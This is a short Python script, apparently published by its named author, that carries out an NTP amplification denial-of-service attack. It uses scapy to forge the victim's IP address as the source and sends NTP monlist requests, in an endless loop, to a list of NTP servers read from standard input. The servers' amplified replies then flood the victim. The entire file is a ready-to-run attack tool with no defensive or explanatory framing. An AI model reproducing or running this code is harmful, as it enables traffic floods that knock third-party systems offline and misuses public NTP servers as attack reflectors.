#!/usr/bin/python
##
# Nicolas THIBAUT
# http://dev2lead.com
##

import sys, time, logging
from scapy.all import *

class NTPDOS:
    def __init__(self, ip):
        self.ip = ip
        self.stack = []
        self.count = 0
        self.index = 0
        self.cmd = "\x17\x00\x03\x2A\x00\x00\x00\x00"
    def __del__(self):
        pass
    def core(self):
        packet = IP(src = self.ip, dst = self.stack[self.index]) / UDP(sport = 80, dport = 123) / self.cmd
        send(packet, verbose = 0)
        self.count = self.count + 1
        self.index = self.count % len(self.stack)
        return 0

def main():
    if "--target" in sys.argv:
        ntpdos = NTPDOS(str(sys.argv[sys.argv.index("--target") + 1]))
        for server in sys.stdin:
            ntpdos.stack.append(server.strip())
        while not 0:
            ntpdos.core()
            if "--interval" in sys.argv and float(sys.argv[sys.argv.index("--interval") + 1]) != 0:
                time.sleep(float(sys.argv[sys.argv.index("--interval") + 1]) / 1000)
    return 0

if __name__ == "__main__":
    main()
